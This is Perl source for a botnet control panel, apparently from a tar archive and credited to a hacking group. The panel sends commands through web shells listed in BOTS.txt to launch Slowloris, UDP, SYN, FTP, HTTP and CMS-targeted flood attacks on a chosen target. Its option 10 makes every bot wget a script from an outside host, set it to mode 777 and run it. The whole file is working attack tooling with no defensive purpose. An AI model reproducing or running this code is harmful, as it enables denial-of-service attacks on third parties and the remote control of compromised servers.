		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}

		goto TRANSPORT;
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck10;
}


TRANSPORT:;
########################
sleep(2);
$cmd = "wget http://g3n3rall-blackhat.persiangig.com/DDOSER/Connection.pl";
$fieldname = "cmd";
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;
print "\n\t";
syswrite STDOUT, "\n\n\t\t ready for wget\n";
sleep(3);
syswrite STDOUT, "\n\t Copying Connection.pl ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
}
syswrite STDOUT, "\n\tConnection.pl Copied !";
sleep(2);
############################
$cmd2 = "chmod 777 Connection.pl";
$fieldname2 = "cmd";
open (BOTS2, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS2>) {
$ATTACK2=$_;
chomp $ATTACK2;
print "\n\t";
syswrite STDOUT, "\n\t Set Permission[777] For Connection.pl ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK2);
$mechanizee->field("$fieldname2" => "$cmd2");
$mechanizee->click();
}
syswrite STDOUT, "\n\t Permission set";
sleep(2);


############################
$cmd3 = "perl Connection.pl";
$fieldname3 = "cmd";
open (BOTS3, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS3>) {
$ATTACK3=$_;
chomp $ATTACK3;
print "\n\t";
syswrite STDOUT, "\n\t Runing Connection.pl ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK3);
$mechanizee->field("$fieldname3" => "$cmd3");
$mechanizee->click();
}
syswrite STDOUT, "\n\t Runed Connection.pl\n";
sleep(2);
syswrite STDOUT, "\n\t Start Attack Now ;)\n";
sleep(4);
goto MENU;
}

###################
###################
###################

if ($Menu =! 1 || 2 || 3 || 4 || 5 || 6 || 7 || 8 || 9 || 10 || 11){
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id  > or < Attack [or Job] is finish \n";
exit;
}
system("pause");

          root/Desktop/Projects/BHG-Botnet-Panel-Private-Version-[linux]/BHG-Botnet-Panel.pl~                 0000777 0000000 0000000 00000064766 11776024524 026772  0                                                                                                    ustar   root                            root                                                                                                                                                                                                                   #!/usr/bin/perl
#BHG Botnet Panel Version BETA [ Private Version ]
#BLACK HAT GROUP SECURITY CENTER
#Code By G3n3Rall
#AnTi.SecurityBoy@Gmail.com
#We Are : Net.Edit0r , A.Crox , 3H34N , Am!n , tHe.K!ll3r , ArYaIeIrAn , G3n3Rall , Mr.XHat , NoL1m1t , Black Viper ....
#www.Black-HG.Org   | Our Forum : www.Black-HG.Org/cc/
#IRANIAN HACKERS
################
use WWW::Mechanize;
use LWP::Simple;
use HTTP::Request;
use LWP::UserAgent;
################
system(($^O eq 'MSWin32') ? 'cls' : 'clear');   #or u can use  system("cls");  in windows and in linux system("clear");
print q {
''''''''''''''''''''''''A'''''''''A''''''''''''''''''''''''''
'''''''''''''''''''''''''A'''''''''A'''''''''''''''''''''''''
'''''''''''''''''''''A'''A'''''''''A'''A'''''''''''''''''''''
'''''''''''''''''''''A''AA'''''''''AA''A'''''''''''''''''''''
'''''''''''''''''''''AA'AAA'''''''AAA'AA'''''''''''''''''''''
'''''''''''''A''''''AA'''AAA'''''AAA'''AA''''''A'''''''''''''
''''''''''''AA''''''AA'''AAA'''''AAA'''AA''''''AA''''''''''''
'''''''''''AA''''''AA''''AAAA'''AAAA''''AA''''''AA'''''''''''
'''''''''''AA'''''AAA''''AAAA''AAAAA''''AAA'''''AAA''''''''''
'''''''A''AAA''''AAAA''''AAAA'''AAAA''''AAAA'''AAAA''A'''''''
'''''''AA'AAAAA''AAAA'''AAAAA'''AAAAA'''AAAA''AAAAA'AA'''''''
'''''''AA'AAAAA''AAAAAAAAAAA'''''AAAAAAAAAAA''AAAAA'A''''''''
'''''''AA'AAAAA''AAAAAAAAAAA'''''AAAAAAAAAAA''AAAAA'AA'''''''
''''''AAA''AAAA'''AAAAAAAAAAAAAAAAAAAAAAAAA'''AAAA''AAA''''''
'''''AAAA''AAAA'''AAAAAAAAAAAAAAAAAAAAAAAAA'''AAAA''AAAA'''''
''''AAAA'''AAAAA'AAAAAAAAAAAAAAAAAAAAAAAAAAA'AAAAA'''AAAA''''
'''AAAA''''AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'''AAAA''''
'''AAAAA''AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA''AAAA''''
''''AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA''''
''''AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA''''
'''''AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'''''
'''''AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'''''
''''''AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA''''''
'''''AAAAA'''''''''''AAAAAAAAAAAAAAAAAAA'''''''''''AAAAA'''''
'''''AAAAAA'''''''''''''AAAAAAAAAAAAA'''''''''''''AAAAAA'''''
''''''AAAAAAA''''''''..'''''AAAAAAAAA'''''..'''''AAAAAA''''''
'''''''AAAAAAAA'''''''''''''AAAAA'''''''''''''AAAAAAAA'''''''
''''''''AAAAAAAAAA'''''''''''AAA'''''''''''AAAAAAAAAA''''''''
'''''''''''AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'''''''''''
''''''''''''''AAAAAAAAAAAAAAA'''AAAAAAAAAAAAAAA''''''''''''''
''''''''''''''''''AAAAAAAAAA'''''AAAAAAAAAA''''''''''''''''''
'''''''''''''''''''AAAAAAAA'''''''AAAAAAAA'''''''''''''''''''
''''''''''''''''''AAAAAAAAA'''''''AAAAAAAAA''''''''''''''''''
''''''''''''''''''AAAAAAAAA'AAAAA'AAAAAAAAA''''''''''''''''''
'''''''''''''''''AAAAAAAAAAAAAAAAAAAAAAAAAAA'''''''''''''''''
'''''''''''''''''AAA''AAAAAAAAAAAAAAAAA''AAA'''''''''''''''''
''''''''''''''''''AA''AAAA''AAAAA''AAAA''AA''''''''''''''''''
''''''''''''''''''''''AAAA''AAAAA''AAAA''''''''''''''''''''''
};

sleep(2);

###############
print"\n \t \t #BHG Botnet Panel Version BETA [Private Version]  |  G3n3Rall";
print"\n \t\t  BLACK-HG.ORG    |Forum:  BLACK-HG.ORG/cc/ ";
MENU:;
print "\n\n\n \t\t\t Choose Your DDoser :\n";
print "\n\n \t\t 1- Slowloris [Good For Apache webservers]";
print "\n \t\t 2- UDP ULTIMATE DDOSER";
print "\n \t\t 3- Multi DDOSER [WORDPRESS - JOOMLA - DRUPAL]";
print "\n \t\t 4- VBulletin DDOSER [ULTIMATE]";
print "\n \t\t 5- Syn Flooder";
print "\n \t\t 6- IHS DDOSER ";
print "\n \t\t 7- Loop Floder ";
print "\n \t\t 8- FTP DDOSER [ULTIMATE]";
print "\n \t\t 9- HTTPD FLOODER ";
print "\n \t\t 10- Wget DDOSERs ON YOUR SERVERS ! & Set 777 Permission ";
print "\n\n \t\t 11- Exit ";
print "\n\n \t Choose ?:";
###################
###################
###################
###################
$Menu =<STDIN>;
if ($Menu==11) {
print"\n\t\t Exit \n";
exit;}
chomp ($Menu);
###################
###################
###################
###################
#Slowloris.pl
if ($Menu == 1){
print "\n\t\t You Choose Slowloris \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);

if ($check == 2){
print " \n \t \t ok ";
goto Target;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}

		goto Target;
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck;
}
Target:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target:";
$Target=<STDIN>;
chomp ($Target);
print "\n\t Enter Port:";
$Port =<STDIN>;
chomp ($Port);
print "\n\t Timeout:";
$Timeout = <STDIN>;
$cmd = "perl slowloris.pl -dns $Target -port $Port -timeout $Timeout";
$fieldname = "cmd";
goto ddos;
#############
ddos:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";

syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target -c $Timeout\"");
exit;

}
###################
###################
###################
###################
#ultimate-ddoser.pl
if ($Menu == 2){
print "\n\t\t You Choose UDP ULTIMATE DDOSER \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck2:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);
if ($check == 2){
print " \n \t \t ok ";
goto Target2;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		goto Target2;
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck2;
}
Target2:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target[ip]:";
$Target=<STDIN>;
chomp ($Target);
print "\n\t Enter Port:";
$Port =<STDIN>;
chomp ($Port);
$cmd = "perl udp-flooder-ultimate.pl $Target $Port";
$fieldname = "cmd";
goto ddos2;
#############
ddos2:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";
syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target\"");
exit;
}
###################
###################
###################
###################
#multi-ddoser.pl
if ($Menu == 3){
print "\n\t\t You Choose MULTI DDOSER \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck3:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);
if ($check == 2){
print " \n \t \t ok ";
goto Target3;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		goto Target3;
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck3;
}
Target3:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target:";
$Target=<STDIN>;
chomp ($Target);
print "\n\tTimeout:";
$Timeout =<STDIN>;
print "\n\n \t Select Options: W = WordPress |  J = Joomla  |  D = Drupal";
print "Options:";
$Options=<STDIN>;
$cmd = "perl multi-ddoser.pl $Target $Timeout $Options";
$fieldname = "cmd";
goto ddos3;
#############
ddos3:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";
syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target -c $Timeout\"");
exit;
}
###################
###################
###################
###################
#vbulletin-ddoser.pl
if ($Menu == 4){
print "\n\t\t You Choose VBulletin DDOSER [ULTIMATE] \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck4:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);
if ($check == 2){
print " \n \t \t ok ";
goto Target4;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		goto Target4;
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck4;
}
Target4:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target:";
$Target=<STDIN>;
chomp ($Target);
print "Forum Path [ example /forum/   or  /:";
$Path=<STDIN>;
$cmd = "perl vbulletin-ddoser.pl $Target $Path";
$fieldname = "cmd";
goto ddos4;
#############
ddos4:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";
syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target\"");
exit;
}
###################
###################
###################
###################
#syn-flooder.pl
if ($Menu == 5){
print "\n\t\t You Choose Syn Flooder \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck5:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);
if ($check == 2){
print " \n \t \t ok ";
goto Target5;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		goto Target5;
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck6;
}
Target5:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target[ip]:";
$Target=<STDIN>;
chomp ($Target);
print "\n\t Enter Port:";
$Port =<STDIN>;
chomp ($Port);
print "\n\t Timeout:";
$Timeout = <STDIN>;
$cmd = "perl syn-flooder.pl $Target $Port $Timeout";
$fieldname = "cmd";
goto ddos5;
#############
ddos5:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";
syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target -c $Timeout\"");
exit;
}
###################
###################
###################
###################
#ihs-ddoser.pl
if ($Menu == 6){
print "\n\t\t You Choose IHS DDOSER \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck6:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);
if ($check == 2){
print " \n \t \t ok ";
goto Target6;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		goto Target6;
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck6;
}
Target6:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target [IP]:";
$Target=<STDIN>;
chomp ($Target);
print "\n\t Enter Port:";
$Port =<STDIN>;
chomp ($Port);
print "\n\t Timeout:";
$Timeout = <STDIN>;
$cmd = "perl ihs-ddoser.pl $Target $Port $Timeout";
$fieldname = "cmd";
goto ddos6;
#############
ddos6:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";
syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target -c $Timeout\"");
exit;
}
###################
###################
###################
###################
#loop-flooder.pl
if ($Menu == 7){
print "\n\t\t You Choose LOOP FLOODER \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck7:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);
if ($check == 2){
print " \n \t \t ok ";
goto Target7;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		goto Target7;
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck7;
}
Target7:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target [IP]:";
$Target=<STDIN>;
chomp ($Target);
print "\n\t Timeout:";
$Timeout = <STDIN>;
$out = $Timeout * 2000000; # THIS DDOSER HAVE DIFFERNT TIMEOUT  1 sec = 2000000
$cmd = "perl loop-flooder.pl $Target $out";
$fieldname = "cmd";
goto ddos7;
#############
ddos7:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";
syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target -c $Timeout\"");
exit;
}
###################
###################
###################
###################
#ftp-ddoser.pl
if ($Menu == 8){
print "\n\t\t You Choose FTP DDOSER \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck8:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);
if ($check == 2){
print " \n \t \t ok ";
goto Target8;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		goto Target8;
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck8;
}
Target8:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target [IP]:";
$Target=<STDIN>;
chomp ($Target);
$cmd = "perl ftp-ddoser.pl $Target";
$fieldname = "cmd";
goto ddos8;
#############
ddos8:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";
syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target\"");
exit;
}
###################
###################
###################
###################
#httpd-flooder.pl
if ($Menu == 9){
print "\n\t\t You Choose HTTPD FLOODER \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck9:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);
if ($check == 2){
print " \n \t \t ok ";
goto Target9;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		goto Target9;
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck9;
}
Target9:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target:";
$Target=<STDIN>;
chomp ($Target);
print "\t Enter Port:";
$Port=<STDIN>;
chomp ($Port);
print "\t Enter Timeout:";
$Timeout=<STDIN>;
chomp ($Timeout);
print "\t Enter Connection Number:";
$Connection=<STDIN>;
chomp ($Connection);
$for == 1;
$cmd = "perl httpd-flooder.pl $Target $Port $Timeout $Connection $for";
$fieldname = "cmd";
goto ddos9;
#############
ddos9:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";
syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target -c $Timeout\"");
exit;
}

###################
###################
###################
#wget and chmod 777 
if ($Menu = 10){
print "\n\n\t PROGRESSING FOR SEND DDOSER TO ALL  BOTS AND SET 777 PERMISSION ....";
print"\n";
print"\n";
sleep(3);
ForCheck10:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);

if ($check == 2){
print " \n \t \t ok ";
goto TRANSPORT;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
